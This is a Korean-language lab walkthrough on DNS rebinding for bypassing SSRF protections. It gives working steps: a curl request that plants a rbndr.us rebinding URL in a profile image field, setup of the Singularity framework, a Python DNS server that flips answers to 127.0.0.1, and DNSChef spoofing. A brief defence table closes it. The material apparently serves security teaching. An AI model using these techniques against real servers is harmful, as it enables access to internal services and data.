    ■ 실습 방법

    ▶ 1단계: DNS 리바인딩 원리 (TOCTOU)
    ```
    1. 공격자: attacker.com 의 DNS A 레코드 → 5.5.5.5 (외부, 정상)
    2. 서버 검증: DNS resolve → 5.5.5.5 → 통과 (외부 IP)
    3. 공격자가 즉시 DNS 변경: attacker.com → 127.0.0.1 (내부)
    4. 서버가 같은 URL로 fetch → 127.0.0.1 (내부 IP) 접근
    ```
    핵심: TTL=0 또는 매우 짧음. 서버가 검증과 fetch 사이 DNS resolve 두 번 함.

    ▶ 2단계: 도구 A — rbndr.us (간이 서비스)
    ```bash
    # 7f000001 = 127.0.0.1
    # 0a141e1e = 10.20.30.30
    URL="http://7f000001.0a141e1e.rbndr.us/"
    curl -X PUT "http://10.20.30.80/api/Users/1" \
      -d "{\"profileImage\":\"$URL\"}"
    # rbndr.us 가 매번 DNS 응답을 두 IP 사이 번갈아 반환 → race condition 으로 내부 IP fetch
    ```

    ▶ 3단계: 도구 B — Singularity of Origin (DNS 리바인딩 framework)
    설치: `git clone https://github.com/nccgroup/singularity`. 사용:
    ```bash
    cd singularity
    npm install
    npm start  # 서버 시작 (DNS + HTTP)
    # 공격자 도메인 설정 (NS 변경) — 학습 환경은 자체 DNS
    # 페이로드: http://attacker.singularity.site/?delay=2000
    ```

    ▶ 4단계: 도구 C — 수동 DNS 서버 (Python)
    ```python
    # 매 쿼리마다 다른 IP 반환
    from dnslib.server import DNSServer
    from dnslib import RR, A, QTYPE
    counter = [0]
    class Resolver:
        def resolve(self, request, handler):
            counter[0] += 1
            ip = '5.5.5.5' if counter[0] == 1 else '127.0.0.1'
            reply = request.reply()
            reply.add_answer(RR('attacker.com', QTYPE.A, ttl=0, rdata=A(ip)))
            return reply
    DNSServer(Resolver(), port=53, address='0.0.0.0').start()
    ```

    ▶ 5단계: 도구 D — DNSChef (MITM DNS)
    ```bash
    pip install dnschef
    # 특정 도메인을 다른 IP 로 응답
    sudo dnschef --fakedomains attacker.com --fakeip 127.0.0.1
    ```

    ▶ 6단계: 방어 메커니즘
    | 방어 | 설명 |
    |---|---|
    | DNS resolve 후 IP pin (1회) | 한 번 resolve 후 그 IP 만 사용 |
    | 검증 + fetch 같은 connection | curl --resolve 으로 강제 |
    | 내부 IP 화이트리스트 (post-resolve) | netaddr.IPNetwork('127/8') 체크 |
    | timeout 설정 | DNS 변경 전 fetch 완료 |

